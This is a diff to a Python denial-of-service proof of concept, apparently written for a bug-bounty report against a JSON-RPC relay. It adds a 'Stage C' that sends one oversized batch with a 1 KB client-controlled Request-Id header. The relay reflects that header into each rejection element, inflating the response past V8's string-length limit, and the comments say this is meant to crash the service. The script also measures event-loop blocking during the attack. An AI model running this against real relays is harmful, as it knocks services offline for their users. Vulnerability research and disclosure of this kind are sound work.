@@ -56,12 +56,16 @@ def build_batch_for_size(size_mb: float) -> tuple[bytes, int]:
     return body, n
 
 
-def post(url: str, body: bytes, timeout: float):
+def post(url: str, body: bytes, timeout: float, request_id: str | None = None):
     """Returns (elapsed, status, data). Captures HTTP error responses (4xx/5xx)
-    as real results instead of raising, so a 400 is reported honestly."""
-    req = urllib.request.Request(
-        url, data=body, headers={"Content-Type": "application/json"}, method="POST"
-    )
+    as real results instead of raising, so a 400 is reported honestly.
+    If request_id is given, it is sent as the client-controlled `Request-Id`
+    header, which the relay reflects into every element of a batch-rejection
+    response (the amplification multiplier)."""
+    headers = {"Content-Type": "application/json"}
+    if request_id is not None:
+        headers["Request-Id"] = request_id
+    req = urllib.request.Request(url, data=body, headers=headers, method="POST")
     t0 = time.monotonic()
     try:
         with urllib.request.urlopen(req, timeout=timeout) as resp:
@@ -104,9 +108,11 @@ def classify(request_n: int, status: int, data: bytes) -> str:
     return "Unexpected response shape — inspect manually."
 
 
-def stage(name: str, url: str, body: bytes, request_n: int, timeout: float, with_probes: bool, probe_workers: int):
+def stage(name: str, url: str, body: bytes, request_n: int, timeout: float, with_probes: bool,
+          probe_workers: int, request_id: str | None = None):
     print(f"\n--- {name} ---")
-    print(f"Request: {len(body)/1024/1024:.4f} MB, {request_n:,} elements")
+    print(f"Request: {len(body)/1024/1024:.4f} MB, {request_n:,} elements"
+          + (f", Request-Id header: {len(request_id)} bytes" if request_id else ""))
 
     probe_latencies: list[float] = []
     stop = threading.Event()
@@ -123,7 +129,7 @@ def stage(name: str, url: str, body: bytes, request_n: int, timeout: float, with
         for w in workers:
             w.start()
 
-    elapsed, status, data = post(url, body, timeout=timeout)
+    elapsed, status, data = post(url, body, timeout=timeout, request_id=request_id)
     if with_probes:
         stop.set()
         time.sleep(0.25)
@@ -153,6 +159,9 @@ def main():
                     help="element count for the tiny mechanism-proof request (>> BATCH_REQUESTS_MAX_SIZE)")
     ap.add_argument("--timeout", type=float, default=120.0)
     ap.add_argument("--probe-workers", type=int, default=4)
+    ap.add_argument("--request-id-size", type=int, default=1024,
+                    help="bytes for the client-controlled Request-Id header in Stage C "
+                         "(the amplification multiplier); 0 disables Stage C")
     args = ap.parse_args()
 
     print(f"Target: {args.url}")
@@ -182,11 +191,27 @@ def main():
         print(f"\nEvent-loop impact: baseline {baseline*1000:.1f} ms -> during "
               f"{statistics.median(during)*1000:.1f} ms  (x{infl:.1f} median inflation)")
 
+    # Stage C: header-boosted SINGLE request. The relay reflects the client
+    # Request-Id header into every element of the rejection response, so a small
+    # header multiplies the response. A ~1KB header on a ~1MB body drives the
+    # response past V8's ~512MB max string length -> JSON.stringify RangeError in
+    # the response path, i.e. a single-request crash trigger (no concurrency).
+    if args.request_id_size > 0:
+        rid = "A" * args.request_id_size
+        body_c, n_c = build_batch_for_size(args.size_mb)
+        projected = n_c * (140 + len(f"[Request ID: ] ") + args.request_id_size)
+        print(f"\n(Projected response for Stage C: ~{projected/1024/1024:.0f} MB; "
+              f"V8 max string ~512 MB -> {'EXCEEDS (expect RangeError/crash)' if projected > 536_870_888 else 'under limit (expect huge allocation)'})")
+        stage("Stage C: header-boosted single request (Request-Id multiplier)", args.url, body_c, n_c,
+              args.timeout, with_probes=True, probe_workers=args.probe_workers, request_id=rid)
+
     print("\nInterpretation:")
     print("  - Stage A array length == its element count  => amplification mechanism is real.")
     print("  - Stage B large factor + probe-latency spike => event-loop-blocking DoS (Medium).")
-    print("  - Stage A/B single-error response            => already mitigated; do NOT submit.")
-    print("  - Stage B 400 'parse' error                  => body over INPUT_SIZE_LIMIT; lower --size-mb.")
+    print("  - Stage C 500 / connection reset / timeout   => single-request serialization failure")
+    print("      or OOM via the Request-Id multiplier (strong 'service crash' evidence).")
+    print("  - Any stage single-error response            => already mitigated; do NOT submit.")
+    print("  - Stage B/C 400 'parse' error                => body over INPUT_SIZE_LIMIT; lower --size-mb.")
 
 
 if __name__ == "__main__":
